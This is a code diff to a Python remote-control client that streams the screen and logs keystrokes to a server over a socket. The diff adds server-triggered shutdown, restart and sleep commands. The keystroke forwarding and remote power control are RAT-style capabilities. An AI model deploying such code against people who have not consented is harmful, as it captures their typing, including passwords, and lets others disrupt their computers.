@@ -1,20 +1,22 @@
 import socket
+
 import cv2
 import struct
 import mss
+
 import numpy as np
 from pynput import keyboard
 
+import os
+import platform
+
 def get_local_ip():
-    # Tạo một socket kết nối theo giao thức UDP
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
-        # Không cần kết nối thật, chỉ cần trỏ tới một IP bất kỳ (ví dụ IP này không tồn tại)
-        # Hệ điều hành sẽ tự động xác định IP nội bộ (LAN) tốt nhất để đi ra ngoài
         s.connect(('10.255.255.255', 1))
         IP = s.getsockname()[0]
     except Exception:
-        IP = '127.0.0.1' # Fallback về localhost nếu không có mạng
+        IP = '127.0.0.1'
     finally:
         s.close()
     return IP
@@ -81,6 +83,55 @@ def on_press(client_socket, key):
             listener.stop()
         send_data(client_socket, f" [{key.name}] ")
 
+def get_os():
+    """Identifies the current operating system."""
+    return platform.system()
+
+
+def shutdown():
+    """Shuts down the computer."""
+    current_os = get_os()
+    print("Initiating shutdown...")
+
+    if current_os == "Windows":
+        os.system("shutdown /s /t 0")
+    elif current_os == "Linux":
+        os.system("shutdown now")
+    elif current_os == "Darwin":
+        os.system("shutdown -h now")
+    else:
+        print(f"OS '{current_os}' not supported for this command.")
+
+
+def restart():
+    """Restarts the computer."""
+    current_os = get_os()
+    print("Initiating restart...")
+
+    if current_os == "Windows":
+        os.system("shutdown /r /t 0")
+    elif current_os == "Linux":
+        os.system("reboot")
+    elif current_os == "Darwin":
+        os.system("shutdown -r now")
+    else:
+        print(f"OS '{current_os}' not supported for this command.")
+
+
+def sleep():
+    """Puts the computer to sleep."""
+    current_os = get_os()
+    print("Initiating sleep mode...")
+
+    if current_os == "Windows":
+        os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
+    elif current_os == "Linux":
+        os.system("systemctl suspend")
+    elif current_os == "Darwin":
+        os.system("pmset sleepnow")
+    else:
+        print(f"OS '{current_os}' not supported for this command.")
+
 # --- PHẦN LUỒNG CHÍNH CỦA CLIENT ---
 CLIENT_IP = get_local_ip()
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -102,4 +153,12 @@ while cmd != 'exit':
         print("Monitoring keyboard and transmitting data... Press 'Esc' to exit.")
         with keyboard.Listener(on_press=lambda key: on_press(client, key)) as listener:
             listener.join()
+    elif cmd == 'power':
+        cmd = client.recv(1024).decode('utf-8')
+        if cmd == 'shutdown':
+            shutdown()
+        elif cmd == 'restart':
+            restart()
+        elif cmd == 'sleep':
+            sleep()
     cmd = client.recv(1024).decode('utf-8')
